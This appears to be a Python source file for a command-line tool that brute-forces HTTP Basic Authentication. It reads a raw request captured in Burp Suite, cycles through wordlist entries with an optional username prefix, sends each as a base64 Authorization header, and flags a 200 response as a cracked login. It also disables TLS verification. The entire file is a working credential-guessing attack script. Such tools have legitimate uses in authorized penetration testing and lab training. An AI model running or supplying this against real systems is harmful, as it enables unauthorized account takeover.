import base64
import requests
import argparse
from colorama import init, Fore, Style

init(autoreset=True)

def parse_raw_request(request_file):
    with open(request_file, "r") as f:
        raw = f.read()

    lines = raw.splitlines()
    method, path, _ = lines[0].split()
    host = ""
    headers = {}

    for line in lines[1:]:
        if line.startswith("Host:"):
            host = line.split(": ", 1)[1]
        elif ": " in line:
            key, value = line.split(": ", 1)
            if "<credentials>" not in value:
                headers[key] = value

    url = f"http://{host}{path}"
    return url, headers

def print_request_debug(url, headers):
    print("\n" + "="*60)
    print(Fore.CYAN + Style.BRIGHT + "📤 Sending HTTP Request")
    print(Fore.YELLOW + f"URL: {url}\n")

    print(Fore.MAGENTA + "Headers:")
    for k, v in headers.items():
        print(f"  {Fore.GREEN}{k}: {Fore.WHITE}{v}")

    print("="*60 + "\n")

def brute_force(url, headers, wordlist, prefix, use_proxy):
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080"
    } if use_proxy else None

    with open(wordlist, "r") as f:
        for word in f:
            word = word.strip()
            if not word:
                continue

            creds = f"{prefix}{word}"
            encoded = base64.b64encode(creds.encode()).decode()
            headers["Authorization"] = f"Basic {encoded}"

            print_request_debug(url, headers)

            try:
                response = requests.get(
                    url,
                    headers=headers,
                    allow_redirects=False,
                    proxies=proxies,
                    verify=False
                )

                if response.status_code == 200:
                    print(Fore.GREEN + f"[+] Success: {creds}")
                    return
                else:
                    print(Fore.RED + f"[-] Failed: {creds} (Status: {response.status_code})")

            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"[!] Request error: {e}")

    print(Fore.RED + "[-] No valid credentials found.")

def main():
    parser = argparse.ArgumentParser(description="🔥 Basic Auth Brute Forcer (Burp Ready)")
    parser.add_argument("-r", "--request", required=True, help="Path to raw HTTP request file")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")
    parser.add_argument("-p", "--prefix", default="", help="Prefix for each wordlist entry (e.g., admin:)")
    parser.add_argument("--proxy", action="store_true", help="Enable proxy to 127.0.0.1:8080 (for Burp Suite)")

    args = parser.parse_args()

    url, headers = parse_raw_request(args.request)
    brute_force(url, headers, args.wordlist, args.prefix, args.proxy)

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
